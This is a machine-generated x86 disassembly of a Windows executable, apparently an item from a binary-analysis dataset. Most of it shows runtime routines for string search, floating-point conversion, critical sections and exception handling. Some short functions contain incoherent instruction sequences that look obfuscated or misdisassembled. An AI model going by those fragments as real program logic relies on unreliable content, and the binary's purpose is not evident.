or eax 0xffffffff
add edx 0x10
jmp r-xdata
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
movdqu xmm1 [ edx ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
por xmm2 xmm1
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_42a01b
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
mov ecx [ ebx + 0x8 ]
sub esp 0x20
cmp [ rw-data ] 0x1
mov dx [ ebx + 0xc ]
jl r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
movzx eax dx
movd xmm0 eax
pshuflw xmm0 xmm0 0x0
pshufd xmm2 xmm0 0x0
cmp ax dx
je r-xdata
xor eax eax
cmp [ ecx ] dx
setne al
dec eax
and eax ecx
jmp r-xdata
movzx eax [ ecx ]
cmp ax dx
je r-xdata
movups xmm0 [ ecx ]
pxor xmm1 xmm1
pcmpeqw xmm1 xmm0
pcmpeqw xmm0 xmm2
por xmm1 xmm0
pmovmskb eax xmm1
test eax eax
jne r-xdata
add ecx 0x2
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
mov eax ecx
test ax ax
je r-xdata
bsf eax eax
mov [ ebp - 0x4 ] eax
add ecx eax
jmp r-xdata
add ecx 0x10
jmp r-xdata
xor eax eax
jmp r-xdata
add ecx 0x2
jmp r-xdata
mov eax ecx
and eax 0xfff
cmp eax 0xff0
ja r-xdata
sub_42a0d0
mov ecx 0x1
movsd xmm5 [ r--data ]
jmp r-xdata
movd eax xmm0
and eax 0x7fffffff
cmp eax 0x7f800000
jae r-xdata
mov edx 0x8
call sub_42a26d
xor eax eax
mov edx 0x80000000
retn
cvtss2sd xmm0 xmm0
cmp ecx 0x2
jne r-xdata
comisd xmm0 xmm5
jae r-xdata
movsd xmm2 [ r--data ]
comisd xmm0 xmm2
jbe r-xdata
movsd xmm6 [ r--data ]
comisd xmm0 xmm6
jb r-xdata
mov edx 0x10
call sub_42a26d
movdqa xmm1 xmm0
psllq xmm1 0x1
psrlq xmm1 0x1
cmp ecx 0x1
je r-xdata
xorpd xmm6 xmm6
comisd xmm1 xmm6
je r-xdata
movsd xmm2 [ r--data ]
comisd xmm1 xmm2
ja r-xdata
movd eax xmm6
psrldq xmm6 0x4
movd edx xmm6
retn
movsd xmm3 [ r--data ]
movsd xmm4 [ r--data ]
movd xmm5 [ r--data ]
movdqa xmm6 xmm0
cmpsd xmm6 xmm1 0x0
movdqa xmm2 xmm1
pand xmm2 xmm3
por xmm2 xmm4
psrlq xmm1 0x34
movdqa xmm4 xmm1
psubq xmm4 xmm5
movdqa xmm3 xmm2
psllq xmm3 xmm4
movdqa xmm4 xmm5
psubq xmm4 xmm1
movdqa xmm7 xmm2
psrlq xmm7 xmm4
pcmpgtd xmm1 xmm5
punpckldq xmm1 xmm1
pand xmm3 xmm1
pandn xmm1 xmm7
por xmm1 xmm3
pxor xmm5 xmm5
psubq xmm5 xmm1
pand xmm1 xmm6
pandn xmm6 xmm5
por xmm6 xmm1
movd eax xmm4
cmp eax 0x0
jle r-xdata
xorpd xmm2 xmm2
comisd xmm1 xmm2
je r-xdata
psllq xmm7 xmm4
pxor xmm2 xmm7
movd eax xmm2
psrldq xmm2 0x4
movd edx xmm2
or eax edx
je r-xdata
push eax
fwait
fnstcw [ esp ]
mov ax [ esp ]
test ax 0x10
pop eax
jne r-xdata
mov edx 0x10
call sub_42a26d
mov edx 0x2
call sub_42a26d
xor eax eax
mov edx 0x80000000
retn
sub_42a0ee
mov ecx 0x3
movsd xmm5 [ r--data ]
movd eax xmm0
and eax 0x7fffffff
cmp eax 0x7f800000
jae r-xdata
mov edx 0x8
call sub_42a26d
xor eax eax
mov edx 0x80000000
retn
cvtss2sd xmm0 xmm0
cmp ecx 0x2
jne r-xdata
comisd xmm0 xmm5
jae r-xdata
movsd xmm2 [ r--data ]
comisd xmm0 xmm2
jbe r-xdata
movsd xmm6 [ r--data ]
comisd xmm0 xmm6
jb r-xdata
mov edx 0x10
call sub_42a26d
movdqa xmm1 xmm0
psllq xmm1 0x1
psrlq xmm1 0x1
cmp ecx 0x1
je r-xdata
xorpd xmm6 xmm6
comisd xmm1 xmm6
je r-xdata
movsd xmm2 [ r--data ]
comisd xmm1 xmm2
ja r-xdata
movd eax xmm6
psrldq xmm6 0x4
movd edx xmm6
retn
movsd xmm3 [ r--data ]
movsd xmm4 [ r--data ]
movd xmm5 [ r--data ]
movdqa xmm6 xmm0
cmpsd xmm6 xmm1 0x0
movdqa xmm2 xmm1
pand xmm2 xmm3
por xmm2 xmm4
psrlq xmm1 0x34
movdqa xmm4 xmm1
psubq xmm4 xmm5
movdqa xmm3 xmm2
psllq xmm3 xmm4
movdqa xmm4 xmm5
psubq xmm4 xmm1
movdqa xmm7 xmm2
psrlq xmm7 xmm4
pcmpgtd xmm1 xmm5
punpckldq xmm1 xmm1
pand xmm3 xmm1
pandn xmm1 xmm7
por xmm1 xmm3
pxor xmm5 xmm5
psubq xmm5 xmm1
pand xmm1 xmm6
pandn xmm6 xmm5
por xmm6 xmm1
movd eax xmm4
cmp eax 0x0
jle r-xdata
xorpd xmm2 xmm2
comisd xmm1 xmm2
je r-xdata
psllq xmm7 xmm4
pxor xmm2 xmm7
movd eax xmm2
psrldq xmm2 0x4
movd edx xmm2
or eax edx
je r-xdata
push eax
fwait
fnstcw [ esp ]
mov ax [ esp ]
test ax 0x10
pop eax
jne r-xdata
mov edx 0x10
call sub_42a26d
mov edx 0x2
call sub_42a26d
xor eax eax
mov edx 0x80000000
retn
sub_42a26d
sub esp 0x20
fwait
fnstcw [ esp ]
movzx eax [ esp ]
cmp edx 0x8
je r-xdata
fldcw [ r--data ]
mov [ esp ] edx
mov [ esp + 0x4 ] 0x0
movsd [ esp + 0x8 ] xmm0
movsd [ esp + 0x10 ] xmm0
mov [ esp + 0x18 ] eax
call sub_423099
fstp st0
test [ edx + r--data ] al
jne r-xdata
add esp 0x20
retn
sub_42a2b1
mov ecx 0x1
movsd xmm5 [ r--data ]
jmp r-xdata
movdqa xmm1 xmm0
psrldq xmm1 0x4
movd eax xmm1
and eax 0x7fffffff
cmp eax 0x7ff00000
jae r-xdata
mov edx 0x8
call sub_42a26d
xor eax eax
mov edx 0x80000000
retn
cmp ecx 0x1
je r-xdata
cmp ecx 0x2
jne r-xdata
movdqa xmm1 xmm0
psllq xmm1 0x1
psrlq xmm1 0x1
movsd xmm2 [ r--data ]
comisd xmm1 xmm2
jbe r-xdata
comisd xmm0 xmm5
jae r-xdata
movsd xmm2 [ r--data ]
comisd xmm0 xmm2
jbe r-xdata
movsd xmm2 [ r--data ]
comisd xmm1 xmm2
jae r-xdata
cmp ecx 0x4
je r-xdata
movsd xmm6 [ r--data ]
comisd xmm0 xmm6
jb r-xdata
mov edx 0x10
call sub_42a26d
movdqa xmm3 xmm0
cmp ecx 0x4
jne r-xdata
xorpd xmm2 xmm2
comisd xmm1 xmm2
je r-xdata
mov edx 0x10
call sub_42a26d
mov edx 0x1
call sub_42a26d
mov edx 0x1
call sub_42a26d
mov edx 0x10
call sub_42a26d
jmp r-xdata
movdqa xmm1 xmm0
psllq xmm1 0x1
psrlq xmm1 0x1
cmp ecx 0x1
je r-xdata
movdqa xmm4 xmm3
psllq xmm4 0x23
psrlq xmm4 0x23
movd eax xmm4
or eax eax
je r-xdata
movsd xmm2 [ r--data ]
comisd xmm3 xmm2
jb r-xdata
xorpd xmm6 xmm6
comisd xmm1 xmm6
je r-xdata
mov edx 0x2
call sub_42a26d
mov edx 0x10
call sub_42a26d
jmp r-xdata
movsd xmm2 [ r--data ]
comisd xmm1 xmm2
ja r-xdata
comisd xmm0 xmm5
jae r-xdata
mov edx 0x10
call sub_42a26d
subpd xmm3 xmm2
movd eax xmm6
psrldq xmm6 0x4
movd edx xmm6
retn
movsd xmm3 [ r--data ]
movsd xmm4 [ r--data ]
movd xmm5 [ r--data ]
movdqa xmm6 xmm0
cmpsd xmm6 xmm1 0x0
movdqa xmm2 xmm1
pand xmm2 xmm3
por xmm2 xmm4
psrlq xmm1 0x34
movdqa xmm4 xmm1
psubq xmm4 xmm5
movdqa xmm3 xmm2
psllq xmm3 xmm4
movdqa xmm4 xmm5
psubq xmm4 xmm1
movdqa xmm7 xmm2
psrlq xmm7 xmm4
pcmpgtd xmm1 xmm5
punpckldq xmm1 xmm1
pand xmm3 xmm1
pandn xmm1 xmm7
por xmm1 xmm3
pxor xmm5 xmm5
psubq xmm5 xmm1
pand xmm1 xmm6
pandn xmm6 xmm5
por xmm6 xmm1
movd eax xmm4
cmp eax 0x0
jle r-xdata
xorpd xmm2 xmm2
comisd xmm1 xmm2
je r-xdata
movsd xmm2 [ r--data ]
comisd xmm0 xmm2
jb r-xdata
psllq xmm7 xmm4
pxor xmm2 xmm7
movd eax xmm2
psrldq xmm2 0x4
movd edx xmm2
or eax edx
je r-xdata
push eax
fwait
fnstcw [ esp ]
mov ax [ esp ]
test ax 0x10
pop eax
jne r-xdata
jmp r-xdata
mov edx 0x10
call sub_42a26d
mov edx 0x2
call sub_42a26d
xor eax eax
mov edx 0x80000000
retn
sub_42a2cf
mov ecx 0x5
movsd xmm5 [ r--data ]
movdqa xmm1 xmm0
psrldq xmm1 0x4
movd eax xmm1
and eax 0x7fffffff
cmp eax 0x7ff00000
jae r-xdata
mov edx 0x8
call sub_42a26d
xor eax eax
mov edx 0x80000000
retn
cmp ecx 0x1
je r-xdata
cmp ecx 0x2
jne r-xdata
movdqa xmm1 xmm0
psllq xmm1 0x1
psrlq xmm1 0x1
movsd xmm2 [ r--data ]
comisd xmm1 xmm2
jbe r-xdata
comisd xmm0 xmm5
jae r-xdata
movsd xmm2 [ r--data ]
comisd xmm0 xmm2
jbe r-xdata
movsd xmm2 [ r--data ]
comisd xmm1 xmm2
jae r-xdata
cmp ecx 0x4
je r-xdata
movsd xmm6 [ r--data ]
comisd xmm0 xmm6
jb r-xdata
mov edx 0x10
call sub_42a26d
movdqa xmm3 xmm0
cmp ecx 0x4
jne r-xdata
xorpd xmm2 xmm2
comisd xmm1 xmm2
je r-xdata
mov edx 0x10
call sub_42a26d
mov edx 0x1
call sub_42a26d
mov edx 0x1
call sub_42a26d
mov edx 0x10
call sub_42a26d
jmp r-xdata
movdqa xmm1 xmm0
psllq xmm1 0x1
psrlq xmm1 0x1
cmp ecx 0x1
je r-xdata
movdqa xmm4 xmm3
psllq xmm4 0x23
psrlq xmm4 0x23
movd eax xmm4
or eax eax
je r-xdata
movsd xmm2 [ r--data ]
comisd xmm3 xmm2
jb r-xdata
xorpd xmm6 xmm6
comisd xmm1 xmm6
je r-xdata
mov edx 0x2
call sub_42a26d
mov edx 0x10
call sub_42a26d
jmp r-xdata
movsd xmm2 [ r--data ]
comisd xmm1 xmm2
ja r-xdata
comisd xmm0 xmm5
jae r-xdata
mov edx 0x10
call sub_42a26d
subpd xmm3 xmm2
movd eax xmm6
psrldq xmm6 0x4
movd edx xmm6
retn
movsd xmm3 [ r--data ]
movsd xmm4 [ r--data ]
movd xmm5 [ r--data ]
movdqa xmm6 xmm0
cmpsd xmm6 xmm1 0x0
movdqa xmm2 xmm1
pand xmm2 xmm3
por xmm2 xmm4
psrlq xmm1 0x34
movdqa xmm4 xmm1
psubq xmm4 xmm5
movdqa xmm3 xmm2
psllq xmm3 xmm4
movdqa xmm4 xmm5
psubq xmm4 xmm1
movdqa xmm7 xmm2
psrlq xmm7 xmm4
pcmpgtd xmm1 xmm5
punpckldq xmm1 xmm1
pand xmm3 xmm1
pandn xmm1 xmm7
por xmm1 xmm3
pxor xmm5 xmm5
psubq xmm5 xmm1
pand xmm1 xmm6
pandn xmm6 xmm5
por xmm6 xmm1
movd eax xmm4
cmp eax 0x0
jle r-xdata
xorpd xmm2 xmm2
comisd xmm1 xmm2
je r-xdata
movsd xmm2 [ r--data ]
comisd xmm0 xmm2
jb r-xdata
psllq xmm7 xmm4
pxor xmm2 xmm7
movd eax xmm2
psrldq xmm2 0x4
movd edx xmm2
or eax edx
je r-xdata
push eax
fwait
fnstcw [ esp ]
mov ax [ esp ]
test ax 0x10
pop eax
jne r-xdata
jmp r-xdata
mov edx 0x10
call sub_42a26d
mov edx 0x2
call sub_42a26d
xor eax eax
mov edx 0x80000000
retn
sub_42a3e0
xorps xmm0 xmm0
cvtsi2sd xmm0 ecx
shr ecx 0x1f
addsd xmm0 [ ecx * 8 + r--data ]
test edx edx
je r-xdata
retn
xorps xmm1 xmm1
cvtsi2sd xmm1 edx
shr edx 0x1f
addsd xmm1 [ edx * 8 + r--data ]
mulsd xmm1 [ r--data ]
addsd xmm0 xmm1
sub_42ad60
push ebp
mov ebp esp
push ecx
call sub_406850
push ecx
lea ecx [ ebp - 0x1 ]
call sub_407370
call sub_401f50
push ecx
call sub_407380
push [ rw-data ]
call j_sub_41a3a5
add esp 0x4
mov [ rw-data ] 0x0
call sub_401f50
mov esp ebp
pop ebp
retn
sub_42ada0
push ebp
mov ebp esp
push ecx
mov ecx rw-data
call sub_4069d0
push ecx
lea ecx [ ebp - 0x1 ]
call sub_407370
call sub_401f50
push ecx
call sub_407380
push [ rw-data ]
call j_sub_41a3a5
add esp 0x4
mov [ rw-data ] 0x0
call sub_401f50
mov ecx rw-data
call sub_4069d0
push ecx
lea ecx [ ebp - 0x1 ]
call sub_407370
call sub_401f50
push ecx
call sub_407380
push [ rw-data ]
call j_sub_41a3a5
add esp 0x4
mov [ rw-data ] 0x0
call sub_401f50
mov esp ebp
pop ebp
retn
sub_401260
push ebp
mov ebp esp
push ecx
call sub_406cc0
push sub_42ad60
call sub_40d83a
add esp 0x4
mov esp ebp
pop ebp
retn
sub_401280
call sub_4023a0
push sub_42ada0
call sub_40d83a
pop ecx
retn
sub_4012a0
push ecx
call sub_401310
push sub_42ae20
call sub_40d83a
pop ecx
retn
sub_4012b2
mov ecx rw-data
call sub_40e54b
push sub_42ae31
call sub_40d83a
pop ecx
retn
sub_4012c8
push sub_42ae3b
call sub_40d83a
pop ecx
retn
sub_4012d4
push sub_42ae45
call sub_40d83a
pop ecx
retn
sub_4012e0
push sub_42ae4f
call sub_40d83a
pop ecx
retn
sub_4012ec
mov ecx rw-data
call sub_40e54b
push sub_42ae59
call sub_40d83a
pop ecx
retn
sub_4020b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] 0x0
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
pop ebp
retn 0x4
sub_402380
call sub_4022c0
push eax
push rw-data
call [ lstrcpyA@IAT ]
jmp sub_404430
sub_4024b0
push esi
mov esi ecx
call sub_4069d0
push [ esi ]
call j_sub_41a3a5
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_4025a4
add esp 0x68
retn
sub_402771
push ebx
push esp
push eax
push esp
push edx
call sub_40287d
jae 0xffffffffccc336d9
add [ eax ] al
add [ ecx - 0x7edb8a1d ] al
iretd
sub_402deb
add esp 0x80
retn
sub_403045
push ebp
pushfd
push edi
pushfd
call sub_403022
mov edx 0xfb89c71
xchg [ edi + edi * 8 - 0x1 ] esp
inc [ ecx + 0xf3e7fc3 ]
test [ edi ] cl
mov [ edx - 0x1 ] eax
sub_4030a2
ja r-xdata
pop eax
pop edx
add esp 0x4
jae r-xdata
xor edx 0xd1e8509c
sub esp 0x18
call sub_402f73
add edx 0x79810f59
add eax 0xff0e830f
sub_403132
push ebx
sub esp 0x14
call sub_403140
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_403153
jmp [ 0x70246c83 ]
jl 0xffffffffebc138c8
sub_403140
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_403153
jmp [ 0x70246c83 ]
jl 0xffffffffebc138c8
sub_40317c
push ebp
push edx
push edi
push ebx
call sub_40318b
jne 0xffffffffa3a517fe
sub_4031af
jmp [ esp + 0xa8 ]
sub_403203
jmp [ esp + 0x2c ]
sub_403464
push ebx
sub esp 0x14
call sub_403472
mov ecx 0xc281e579
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_403485
jmp [ 0x70246c83 ]
jl 0xffffffffebc13bfa
sub_403472
sub [ esp + 0x64 ] r-xdata
sub esp 0x4
jae r-xdata
push esp
push ecx
call sub_403485
jmp [ 0x70246c83 ]
jl 0xffffffffebc13bfa
sub_4034ae
push ebp
push edx
push edi
push ebx
call sub_4034bd
jne 0xffffffffa3a51b30
sub_4034e1
jmp [ esp + 0xa8 ]
sub_403535
jmp [ esp + 0x2c ]
sub_403631
add esp 0x68
retn
sub_405b60
push 0x104
push 0x0
push rw-data
call sub_411230
push [ rw-data ]
push rw-data
push rw-data
call sub_4117a0
add esp 0x18
mov ecx rw-data
jmp sub_405ba0
sub_406ee0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ eax + 0x4 ] 0x0
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
pop ebp
retn 0x4
sub_407390
mov eax rw-data
retn
sub_407890
mov ecx [ ecx + 0x4 ]
mov eax r--data
test ecx ecx
cmovne eax ecx
retn
sub_4078d0
lea eax [ ecx + 0x4 ]
mov [ ecx ] r--data
push eax
call sub_410a10
pop ecx
retn
sub_407b10
[ ecx + 0x4 ]
retn
sub_407b20
or eax 0xffffffff
[ ecx + 0x4 ] eax
mov eax 0x0
cmove eax ecx
retn
sub_407b90
mov eax 0x1
retn
sub_407c60
push ebp
mov ebp esp
lea eax [ ecx + 0x8 ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
call sub_40ea4a
add esp 0x8
pop ebp
retn 0x4
sub_407cd0
push ebp
mov ebp esp
lea eax [ ecx + 0x8 ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
call sub_40eb44
add esp 0x8
pop ebp
retn 0x4
sub_407d40
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_407d70
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_407e60
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x8
sub_408250
mov eax r--data
retn
sub_409c30
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
pop esi
retn
push eax
call j_sub_41a3a5#2
add esp 0x4
sub_40a830
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
retn
push eax
call sub_416caf
pop ecx
sub_40a840
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
retn
push eax
call sub_416c9b
pop ecx
sub_40a900
mov eax [ ecx - 0x18 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x18 ] r--data
mov eax [ ecx - 0x18 ]
mov edx [ eax + 0x4 ]
lea eax [ edx - 0x18 ]
mov [ edx + ecx - 0x1c ] eax
retn
sub_40a930
mov eax ecx
retn 0xc
sub_40ac10
or eax 0xffffffff
retn
sub_40ac20
xor eax eax
xor edx edx
retn
sub_40ac30
or eax 0xffffffff
retn 0x4
sub_40aee0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
cmp [ ebp + 0x14 ] eax
cmovb eax [ ebp + 0x14 ]
pop ebp
retn 0x10
sub_40af00
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn 0x10
sub_40af20
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov [ ecx ] eax
mov ecx [ ebp + 0x20 ]
mov eax [ ebp + 0x18 ]
mov [ ecx ] eax
mov eax 0x3
pop ebp
retn 0x1c
sub_40af40
mov al 0x1
retn
sub_40bc10
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov eax [ ecx + 0x30 ]
mov eax [ eax ]
cdq
retn
sub_40bc30
mov eax [ ecx + 0x1c ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
cdq
retn
mov eax [ ecx + 0x2c ]
mov eax [ eax ]
cdq
retn
sub_40d554
mov eax r-xdata
retn
sub_40d55a
sub ecx [ ecx - 0x4 ]
jmp sub_40ac90
sub_40d562
sub ecx [ ecx - 0x4 ]
jmp sub_40ad70
sub_40d795
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
xor ecx ecx
cmp [ eax ] 0xc0000005
sete cl
mov eax ecx
retn
sub_40d7ba
push ebp
mov ebp esp
call sub_40e114
test eax eax
je r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
mov ecx rw-data
xchg [ ecx ] eax
sub_40d83a
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40d7ff
neg eax
pop ecx
sbb eax eax
neg eax
dec eax
pop ebp
retn
sub_40d84f
push ebp
mov ebp esp
pop ebp
jmp sub_40d5ac
j_sub_41a3a5#3
jmp j_sub_41a3a5
sub_40d91d
push rw-data
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call [ CloseHandle@IAT ]
sub_40d9be
push rw-data
call [ EnterCriticalSection@IAT ]
retn
sub_40da0b
push rw-data
call [ LeaveCriticalSection@IAT ]
retn
_start
call sub_40e2fb
jmp sub_40db3a
sub_40dcc0
push ebp
mov ebp esp
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push [ ebp + 0x8 ]
call [ UnhandledExceptionFilter@IAT ]
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop ebp
retn
sub_40dde3
push ebp
mov ebp esp
push 0x8
call sub_40ddef
pop ebp
retn
sub_40debf
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_407860
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40deda
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40def2
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_407860
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40df0d
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40df52
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
call sub_40df0d
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_4111b8
int3
sub_40e110
xor eax eax
inc eax
retn
sub_40e114
xor eax eax
cmp [ rw-data ] eax
setne al
retn
sub_40e23b
push sub_40e247
call [ SetUnhandledExceptionFilter@IAT ]
retn
sub_40e2e6
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx

sub_40e397
mov eax 0x4000
retn
sub_40e39d
push rw-data
call [ InitializeSListHead@IAT ]
retn
sub_40e3a9
push 0x30000
push 0x10000
push 0x0
call sub_419123
add esp 0xc
test eax eax
jne r-xdata
push 0x7
call sub_40e120
int3
retn
sub_40e3ca
mov eax rw-data
retn
sub_40e3d0
call sub_407390
mov ecx [ eax + 0x4 ]
or [ eax ] 0x4
mov [ eax + 0x4 ] ecx
call sub_40e3ca
mov ecx [ eax + 0x4 ]
or [ eax ] 0x2
mov [ eax + 0x4 ] ecx
retn
sub_40e3ed
xor eax eax
cmp [ rw-data ] eax
sete al
retn
sub_40e3f9
mov eax rw-data
retn
sub_40e3ff
mov eax rw-data
retn
sub_40e45b
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_407860
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40e497
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_407860
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40e4b2
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_407860
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40e4ee
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
call sub_40deda
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_4111b8
int3
sub_40e50b
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_40e476
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_4111b8
int3
sub_40e52b
push ebp
mov ebp esp
sub esp 0xc
lea ecx [ ebp - 0xc ]
push [ ebp + 0x8 ]
call sub_40e4cd
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_4111b8
int3
sub_40e7b7
mov eax [ rw-data ]
retn
sub_40e952
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_40e9b3
mov [ rw-data ] 0x1
call sub_40ee8f
pop ecx
sub_40edbf
push ebp
mov ebp esp
pop ebp
jmp sub_40ed1d
sub_40edc8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ eax * 4 + r--data ]
push [ ebp + 0x8 ]
call sub_419af0
add esp 0xc
pop ebp
retn
j_sub_410371
jmp sub_410371
sub_40edea
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteCriticalSection@IAT ]
pop ebp
retn
sub_40edf8
push ebp
mov ebp esp
push 0x0
push 0xfa0
push [ ebp + 0x8 ]
call sub_40f493
add esp 0xc
pop ebp
retn
sub_40ee0f
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ EnterCriticalSection@IAT ]
pop ebp
retn
sub_40ee1d
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40f66c
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_40f675
mov esp [ ebp - 0x18 ]
call sub_4190e7
sub_40f6a0
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_407860
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_40f6bb
and [ ecx + 0x4 ] 0x0
mov eax ecx
and [ ecx + 0x8 ] 0x0
mov [ ecx + 0x4 ] r--data
mov [ ecx ] r--data
retn
sub_40f75d
push [ ebp - 0x14 ]
call sub_40f944
pop ecx
retn
sub_40f88f
push 0x4
mov eax sub_42ad3c
call sub_429785
call sub_4134cc
cmp [ eax + 0x1c ] 0x0
jne r-xdata
call sub_4190e7
and [ ebp - 0x4 ] 0x0
call sub_413494
sub_40ff96
xor eax eax
inc eax
retn
sub_40ff9a
mov esp [ ebp - 0x18 ]
call sub_4190e7
sub_4100c1
xor eax eax
inc eax
retn
sub_410190
push [ ebp - 0x14 ]
call sub_4100d5
pop ecx
retn
sub_4101ce
call sub_4134cc
cmp [ eax + 0x18 ] 0x0
jle r-xdata
retn
call sub_4134cc
dec [ eax + 0x18 ]
j_sub_4190e7
jmp sub_4190e7
sub_410371
call sub_4134cc
xor ecx ecx
cmp [ eax + 0x18 ] ecx
setne al
retn
sub_410a2f
xor ecx ecx
mov edx rw-data
xor eax eax
[ edx ] ecx
mov ecx [ rw-data ]
xor eax [ rw-data ]
and ecx 0x1f
ror eax cl
retn
sub_410a4e
push esi
call sub_410a2f
mov esi eax
test esi esi
je r-xdata
call sub_419afb
mov ecx esi
call j_sub_401f50
call esi
sub_411199
xor eax eax
push eax
push eax
push eax
push rw-data
call sub_401000
add esp 0x10
retn
sub_4111ac
push rw-data
call sub_401088
pop ecx
retn
sub_413494
push esi
call sub_4134cc
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
call sub_4190e7
mov ecx esi
call j_sub_401f50
call esi
sub_4134b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
cmp eax rw-data
je r-xdata
push eax
call sub_41a3a5
pop ecx
sub_41359f
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
retn
push eax
